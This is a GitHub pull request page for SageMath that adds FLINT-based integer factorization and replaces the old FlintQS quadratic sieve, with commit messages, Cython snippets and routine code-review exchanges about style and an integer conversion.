=== Content from github.com_fae37a7c_20250114_181646.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsagemath%2Fsage%2Fpull%2F35419)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsagemath%2Fsage%2Fpull%2F35419)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=sagemath%2Fsage)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[sagemath](/sagemath)
/
**[sage](/sagemath/sage)**
Public

* [Notifications](/login?return_to=%2Fsagemath%2Fsage) You must be signed in to change notification settings
* [Fork
  506](/login?return_to=%2Fsagemath%2Fsage)
* [Star
   1.5k](/login?return_to=%2Fsagemath%2Fsage)

* [Code](/sagemath/sage)
* [Issues
  5k+](/sagemath/sage/issues)
* [Pull requests
  440](/sagemath/sage/pulls)
* [Discussions](/sagemath/sage/discussions)
* [Actions](/sagemath/sage/actions)
* [Wiki](/sagemath/sage/wiki)
* [Security](/sagemath/sage/security)
* [Insights](/sagemath/sage/pulse)

Additional navigation options

* [Code](/sagemath/sage)
* [Issues](/sagemath/sage/issues)
* [Pull requests](/sagemath/sage/pulls)
* [Discussions](/sagemath/sage/discussions)
* [Actions](/sagemath/sage/actions)
* [Wiki](/sagemath/sage/wiki)
* [Security](/sagemath/sage/security)
* [Insights](/sagemath/sage/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fsagemath%2Fsage%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fsagemath%2Fsage%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Add "flint" factorization algorithm and replace qsieve implementation #35419

 Merged

[vbraun](/vbraun)
merged 15 commits into
[sagemath:develop](/sagemath/sage/tree/develop "sagemath/sage:develop")
from
orlitzky:factor-flint

Apr 13, 2023

 Merged

# [Add "flint" factorization algorithm and replace qsieve implementation](#top) #35419

[vbraun](/vbraun)
merged 15 commits into
[sagemath:develop](/sagemath/sage/tree/develop "sagemath/sage:develop")
from
orlitzky:factor-flint

Apr 13, 2023

[Conversation
30](/sagemath/sage/pull/35419)
[Commits
15](/sagemath/sage/pull/35419/commits)
[Checks
0](/sagemath/sage/pull/35419/checks)
[Files changed](/sagemath/sage/pull/35419/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![orlitzky](https://avatars.githubusercontent.com/u/1432135?s=60&v=4)](/orlitzky)

Copy link

Contributor

### @orlitzky **[orlitzky](/orlitzky)** commented [Apr 2, 2023](#issue-1650935176)

I recently [asked about FlintQS on sage-devel](https://groups.google.com/g/sage-devel/c/DV4IwpzEyu4) and was made a maintainer of <https://github.com/sagemath/FlintQS>. The original goal was to merge some pull requests that fix memory errors and C++ standards non-compliance. In the process I noticed that FlintQS also uses `/tmp` unsafely, with predictable filenames that can be hijacked.

To me, much of the code in FlintQS looked like an early version of the `qsieve_factor()` function that eventually made it into FLINT itself. I asked Fredrik Johansson about this and he said we probably don't need FlintQS any more, subject to benchmarking, and also suggested that we add an `algorithm="flint"` keyword for integer factorization to Sage, making use of `fmpz_factor()` in FLINT.

Since they are closely related, this PR does those two things:

* Add `algorithm="flint"` for integer factorization, and
* Replace FlintQS with FLINT's `qsieve_factor()` as the implementation of `qsieve()` in Sage.

Benchmarks show that the new implementation is a bit slower, but returns correct answers much more reliably. The relevant docs have been updated, and the implementation was moved from `sage.interfaces.qsieve` to `sage.libs.flint.qsieve`. A deprecation warning is raised for the old module.

The output format has changed to include the exponents in the factorization, which is a breaking change, but there is already a big warning for `qsieve()` that says the answers might be completely wrong, so I don't think we're breaking a promise in this case.

Sorry, something went wrong.

All reactions

 [orlitzky](/orlitzky)
added 7 commits
[April 2, 2023 08:31](#commits-pushed-0f08bae)

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[Add "flint" algorithm for integer factorization.](/sagemath/sage/pull/35419/commits/0f08bae4991baa1dae644fc3938d63d1bd75b002 "Add \"flint\" algorithm for integer factorization.

We support a few integer factoring algorithms, including PARI (the
default), qsieve (via FlintQS), and ECM-GMP. Sage already includes the
FLINT library, and FLINT has its own integer factoring routine. This
commit adds algorithm=\"flint\" as an option, e.g.

  sage: ZZ(100).factor(algorithm=\"flint\")

To accomplish this, fmpz_factor() was added to sage.libs.flint, and a
wrapper factor_using_flint() was added to sage.rings.factorint. The
new option was also added to the global factor() function.")`
 …

`[0f08bae](/sagemath/sage/pull/35419/commits/0f08bae4991baa1dae644fc3938d63d1bd75b002)`

```
We support a few integer factoring algorithms, including PARI (the
default), qsieve (via FlintQS), and ECM-GMP. Sage already includes the
FLINT library, and FLINT has its own integer factoring routine. This
commit adds algorithm="flint" as an option, e.g.

  sage: ZZ(100).factor(algorithm="flint")

To accomplish this, fmpz_factor() was added to sage.libs.flint, and a
wrapper factor_using_flint() was added to sage.rings.factorint. The
new option was also added to the global factor() function.
```

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[Reimplement qsieve() using FLINT's qsieve_factor().](/sagemath/sage/pull/35419/commits/edcf4b9aab231c599282286e62e674c97bb2aef7 "Reimplement qsieve() using FLINT's qsieve_factor().

The qsieve() function from sage.interfaces.qsieve uses an old,
standalone copy of Bill Hart's quadratic sieve that was moved into its
own package, called FlintQS. This implementation isn't terribly
reliable by modern standards (just look at the docstring), and it
requires maintenance for security issues and to appease newer
compilers.

However, in the intervening years since FlintQS was forked, a
quadratic sieve was added to FLINT itself, as qsieve_factor(). This is
a bit slower than FlintQS in general, but returns the right answer
much more often. Instead of bringing FlintQS up to date, this commit
reimplements sage's qsieve() with FLINT's qsieve_factor().

This entails adding qsieve_factor() to sage.libs.flint, and rewriting
qsieve() to call it and process the output. The implementation is very
similar to factor(n, algorithm=\"flint\").

The output type of the function has necessarily changed, since we now
provide not only the factors but their exponents as well.")`
 …

`[edcf4b9](/sagemath/sage/pull/35419/commits/edcf4b9aab231c599282286e62e674c97bb2aef7)`

```
The qsieve() function from sage.interfaces.qsieve uses an old,
standalone copy of Bill Hart's quadratic sieve that was moved into its
own package, called FlintQS. This implementation isn't terribly
reliable by modern standards (just look at the docstring), and it
requires maintenance for security issues and to appease newer
compilers.

However, in the intervening years since FlintQS was forked, a
quadratic sieve was added to FLINT itself, as qsieve_factor(). This is
a bit slower than FlintQS in general, but returns the right answer
much more often. Instead of bringing FlintQS up to date, this commit
reimplements sage's qsieve() with FLINT's qsieve_factor().

This entails adding qsieve_factor() to sage.libs.flint, and rewriting
qsieve() to call it and process the output. The implementation is very
similar to factor(n, algorithm="flint").

The output type of the function has necessarily changed, since we now
provide not only the factors but their exponents as well.
```

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[Drop obsolete FlintQS package.](/sagemath/sage/pull/35419/commits/bc06aad2d60c374af39252243b84ee485690fd76 "Drop obsolete FlintQS package.

Now that qsieve() is implemented with the FLINT library, the
standalone QuadraticSieve program provided by the FlintQS package is
not needed.")`
 …

`[bc06aad](/sagemath/sage/pull/35419/commits/bc06aad2d60c374af39252243b84ee485690fd76)`

```
Now that qsieve() is implemented with the FLINT library, the
standalone QuadraticSieve program provided by the FlintQS package is
not needed.
```

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[src/sage/misc/citation.pyx: drop qsieve citation.](/sagemath/sage/pull/35419/commits/1f06bd282beb0bcaa21770451ee1ec475382b97e "src/sage/misc/citation.pyx: drop qsieve citation.

We no longer have a separate \"interface\" for qsieve(). It now calls a
function from the FLINT library, and FLINT is already cited.")`
 …

`[1f06bd2](/sagemath/sage/pull/35419/commits/1f06bd282beb0bcaa21770451ee1ec475382b97e)`

```
We no longer have a separate "interface" for qsieve(). It now calls a
function from the FLINT library, and FLINT is already cited.
```

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[src/sage/tests/book_stein_ent.py: update qsieve() output.](/sagemath/sage/pull/35419/commits/efbe6b14d3fc93b3bdfb8443a33e7292b9084643 "src/sage/tests/book_stein_ent.py: update qsieve() output.")`

`[efbe6b1](/sagemath/sage/pull/35419/commits/efbe6b14d3fc93b3bdfb8443a33e7292b9084643)`

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[src/doc/en/thematic_tutorials: update material relating to qsieve().](/sagemath/sage/pull/35419/commits/ca6503fc3bb488dbede097b1894370e84eb2a1d6 "src/doc/en/thematic_tutorials: update material relating to qsieve().

The integer factorization tutorial suggests that qsieve() is the best
algorithm, that it is faster than PARI, and that sage's generic
factor() should be rewritten to use qsieve() and ecm.factor(). We have
toned down these claims:

  * PARI has gotten much faster and is competitive with qsieve()
    now that qsieve() is implemented with qsieve_factor() and
    returns fewer wildly incorrect answers.

  * I highly doubt that it's obvious which algorithm will work the
    best before you actually try them, making it very hard to improve
    on what PARI or FLINT are doing in a generic factor().

The (not tested) timings have also been removed so that we can test
the output. Not only are the timings outdated and random, but they
aren't even comparatively accurate anymore (for example, PARI doesn't
take noticeably longer to factor the integer we give it than qsieve
does). In any case, it's nice to check that the examples work.")`
 …

`[ca6503f](/sagemath/sage/pull/35419/commits/ca6503fc3bb488dbede097b1894370e84eb2a1d6)`

```
The integer factorization tutorial suggests that qsieve() is the best
algorithm, that it is faster than PARI, and that sage's generic
factor() should be rewritten to use qsieve() and ecm.factor(). We have
toned down these claims:

  * PARI has gotten much faster and is competitive with qsieve()
    now that qsieve() is implemented with qsieve_factor() and
    returns fewer wildly incorrect answers.

  * I highly doubt that it's obvious which algorithm will work the
    best before you actually try them, making it very hard to improve
    on what PARI or FLINT are doing in a generic factor().

The (not tested) timings have also been removed so that we can test
the output. Not only are the timings outdated and random, but they
aren't even comparatively accurate anymore (for example, PARI doesn't
take noticeably longer to factor the integer we give it than qsieve
does). In any case, it's nice to check that the examples work.
```

[![@orlitzky](https://avatars.githubusercontent.com/u/1432135?s=40&v=4)](/orlitzky)

`[Move qsieve() from sage.interfaces to sage.libs.flint.](/sagemath/sage/pull/35419/commits/cfe19b457a5730d5d4e69e4671d3132352578630 "Move qsieve() from sage.interfaces to sage.libs.flint.

This move reflects the recent reimplementation of qsieve() using the
FLINT library. A deprecation warning has been added for the old name,
and all uses within the sage library have been updated.")`
 …

`[cfe19b4](/sagemath/sage/pull/35419/commits/cfe19b457a5730d5d4e69e4671d3132352578630)`

```
This move reflects the recent reimplementation of qsieve() using the
FLINT library. A deprecation warning has been added for the old name,
and all uses within the sage library have been updated.
```

[![videlec](https://avatars.githubusercontent.com/u/5619446?s=60&v=4)](/videlec)

**[videlec](/videlec)**
suggested changes
[Apr 2, 2023](#pullrequestreview-1368090956)

 [View reviewed changes](/sagemath/sage/pull/35419/files/cfe19b457a5730d5d4e69e4671d3132352578630)

Copy link

Contributor

### @videlec **[videlec](/videlec)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Nice to clean that up!

* Instead of writing twice the same code, why don't you write a function to convert the `fmpz_factor_t` to the proper sage `Factorization` object?
* I do not understand why one of the factorization function ends up in `sage/rings/factorint.pyx` while the other is in `sage/libs/flint/qsieve.pyx`. To my mind, it would make more sense to keep these two together. One possible option is to make them **methods** of the sage `Integer` object (as we do have `_rank_linbox`, `_rank_flint` on matrices).
* Note that there is a third factorization from flint : `n_factor_to_list` from `sage/libs/flint/ulong_extras.pyx`

Sorry, something went wrong.

All reactions

[src/sage/libs/flint/qsieve.pyx](/sagemath/sage/pull/35419/files/cfe19b457a5730d5d4e69e4671d3132352578630#diff-26150da2f912d1f3a852133f73e3b62c87dd4ea58023ea711e7986c304e0aee2)
Outdated

|  |  | [(10000000000000000051, 1), (100000000000000000039, 1)] |
| --- | --- | --- |
|  |  |  |
|  |  | """ |
|  |  | if n.is\_zero(): |

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 2, 2023](#discussion_r1155319028)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

In this line you already assume that `n` is of type `Integer`?

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 3, 2023](#discussion_r1155924742)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

There were a few mistakes here. I've updated that function to call `n = Integer(n)` first, and then afterwards, it raises an `ArithmeticError` if `n.is_zero()`. That's what the other user-facing factorization functions do.

Sorry, something went wrong.

All reactions

[src/sage/libs/flint/qsieve.pyx](/sagemath/sage/pull/35419/files/cfe19b457a5730d5d4e69e4671d3132352578630#diff-26150da2f912d1f3a852133f73e3b62c87dd4ea58023ea711e7986c304e0aee2)

|  |  | from sage.libs.gmp.mpz cimport mpz\_t, mpz\_init, mpz\_set, mpz\_clear |
| --- | --- | --- |
|  |  | from sage.rings.integer cimport Integer |
|  |  |  |
|  |  | def qsieve(n): |

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 2, 2023](#discussion_r1155319081)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Why not `def qsieve(Integer n)`?

And I suggest to use `factor_qsieve` rather than `qsieve`.

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 3, 2023](#discussion_r1155942720)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

`qsieve()` is in the global namespace and is documented in a few places, so I was reluctant to break too many things. The old implementation called `n = ZZ(n)` at the start, so, for example, you could pass it a rational number (with denominator 1) and it would factor it for you. I left the name alone for similar reasons.

If it were entirely up to me, I would remove `qsieve` from the global namespace, leaving only `n.factor(algorithm="qsieve")` and `factor(n, algorithm="qsieve")` as the official interfaces to it.

Sorry, something went wrong.

All reactions

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 12, 2023](#discussion_r1163755519)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

This is not ideal because things like `qsieve('5')` or `qsieve(5.0)` would then work. It is fine to leave it but not a great interface.

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 12, 2023](#discussion_r1164082563)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

No doubt, having `qsieve()` in the global scope *at all* is an anachronism today. It should be an internal function, with the blessed interface to it being `ZZ(x).factor(algorithm="qsieve")`. I'll open another issue for this.

Sorry, something went wrong.

All reactions

[src/sage/libs/flint/qsieve.pyx](/sagemath/sage/pull/35419/files/cfe19b457a5730d5d4e69e4671d3132352578630#diff-26150da2f912d1f3a852133f73e3b62c87dd4ea58023ea711e7986c304e0aee2)
Outdated

|  |  |  |
| --- | --- | --- |
|  |  | cdef fmpz\_factor\_t factors |
|  |  | fmpz\_factor\_init(factors) |
|  |  | qsieve\_factor(factors,p) |

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 2, 2023](#discussion_r1155319291)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

space after ',' is needed

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 2, 2023](#discussion_r1155380797)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Which linter is complaining about this and the others? I can run them myself to save you some trouble.

Sorry, something went wrong.

All reactions

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 3, 2023](#discussion_r1155772378)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

<https://github.com/sagemath/sage/actions/runs/4588779402/jobs/8103233381?pr=35419>

(though not all code style seems activated and the one above is not seen)

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 3, 2023](#discussion_r1155929619)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Ok, they should all be fixed. I can't resolve the warnings that complain about cython constructs like `<foo>n` and `&var` however.

Sorry, something went wrong.

All reactions

[src/sage/libs/flint/qsieve.pyx](/sagemath/sage/pull/35419/files/cfe19b457a5730d5d4e69e4671d3132352578630#diff-26150da2f912d1f3a852133f73e3b62c87dd4ea58023ea711e7986c304e0aee2)
Outdated

|  |  | mpz\_set(f.value, mpz\_factor) |
| --- | --- | --- |
|  |  | mpz\_clear(mpz\_factor) |
|  |  | e = int(factors.exp[i]) |
|  |  | pairs.append( (f,e) ) |

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 2, 2023](#discussion_r1155319346)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

space after `,` is needed. And spaces around '(' should be removed (otherwise linter complains)

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 3, 2023](#discussion_r1155929781)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Done.

Sorry, something went wrong.

All reactions

[src/sage/rings/factorint.pyx](/sagemath/sage/pull/35419/files/cfe19b457a5730d5d4e69e4671d3132352578630#diff-0649a8757a8475a366b2c1a7418f6b14a45a6113be95f949d6b3f42187848ad8)
Outdated

|  |  |  |
| --- | --- | --- |
|  |  | cdef fmpz\_factor\_t factors |
|  |  | fmpz\_factor\_init(factors) |
|  |  | fmpz\_factor(factors,p) |

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 2, 2023](#discussion_r1155319563)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

space after `,`

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 3, 2023](#discussion_r1155929879)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Done.

Sorry, something went wrong.

All reactions

[src/sage/rings/factorint.pyx](/sagemath/sage/pull/35419/files/cfe19b457a5730d5d4e69e4671d3132352578630#diff-0649a8757a8475a366b2c1a7418f6b14a45a6113be95f949d6b3f42187848ad8)
Outdated

|  |  | pairs = [] |
| --- | --- | --- |
|  |  | if factors.sign < 0: |
|  |  | # FLINT doesn't return the plus/minus one factor. |
|  |  | pairs.append( (Integer(-1), int(1)) ) |

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 2, 2023](#discussion_r1155319605)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

no spaces around `(` and `)`

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 3, 2023](#discussion_r1155930004)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Done.

Sorry, something went wrong.

All reactions

[src/sage/rings/factorint.pyx](/sagemath/sage/pull/35419/files/cfe19b457a5730d5d4e69e4671d3132352578630#diff-0649a8757a8475a366b2c1a7418f6b14a45a6113be95f949d6b3f42187848ad8)
Outdated

|  |  | mpz\_set(f.value, mpz\_factor) |
| --- | --- | --- |
|  |  | mpz\_clear(mpz\_factor) |
|  |  | e = int(factors.exp[i]) |
|  |  | pairs.append( (f,e) ) |

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 2, 2023](#discussion_r1155319637)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

space after `,` and no spaces around `(` and `)`

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 3, 2023](#discussion_r1155930096)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Done.

Sorry, something went wrong.

All reactions

[src/sage/libs/flint/qsieve.pyx](/sagemath/sage/pull/35419/files/cfe19b457a5730d5d4e69e4671d3132352578630#diff-26150da2f912d1f3a852133f73e3b62c87dd4ea58023ea711e7986c304e0aee2)
Outdated

|  |  | cdef mpz\_t mpz\_factor; |
| --- | --- | --- |
|  |  | for i in range(factors.num): |
|  |  | mpz\_init(mpz\_factor) |
|  |  | fmpz\_get\_mpz(mpz\_factor, &factors.p[i]) |

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 2, 2023](#discussion_r1155320001)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I do not understand why you need `mpz_factor` here at all? The value of the corresponding `factors.p[i]` could directly be set to `f.value` below without relying on the intermediate `mpz_factor`.

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 3, 2023](#discussion_r1155935391)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

It might not crash due to the underlying representations being compatible, but somehow we need to get a GMP integer from the FLINT integer, and AFAIK `fmpz_get_mpz()` is the way to do it. Looking at the FLINT source, it's doing *something* nontrivial:

```
void
fmpz_get_mpz(mpz_t x, const fmpz_t f)
{
    if (!COEFF_IS_MPZ(*f))
        flint_mpz_set_si(x, *f);      /* set x to small value */
    else
        mpz_set(x, COEFF_TO_PTR(*f));   /* set x to large value */
}
```

Sorry, something went wrong.

All reactions

Copy link

Contributor

### @videlec **[videlec](/videlec)** [Apr 6, 2023](#discussion_r1160277072)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

What I tried to suggest was

```
-    cdef mpz_t mpz_factor
    for i in range(factors.num):
-        mpz_init(mpz_factor)
-        fmpz_get_mpz(mpz_factor, &factors.p[i])
        f = Integer()
-        mpz_set(f.value, mpz_factor)
-        mpz_clear(mpz_factor)
+        fmpz_get_mpz(f.value, &factors.p[i])
```

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @orlitzky **[orlitzky](/orlitzky)** [Apr 6, 2023](#discussion_r1160286477)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Yes, right, obviously :)

It works, thanks for being patient.

Sorry, something went wrong.

All reactions

[src/sage/libs/flint/qsieve.pyx](/sagemath/sage/pull/35419/files/cfe19b457a5730d5d4e69e4671d3132352578630#diff-26150da2f912d1f3a852133f73e3b62c87dd4ea58023ea711e7986c304e0aee2)
Outdated

|  |  | pairs = [] |
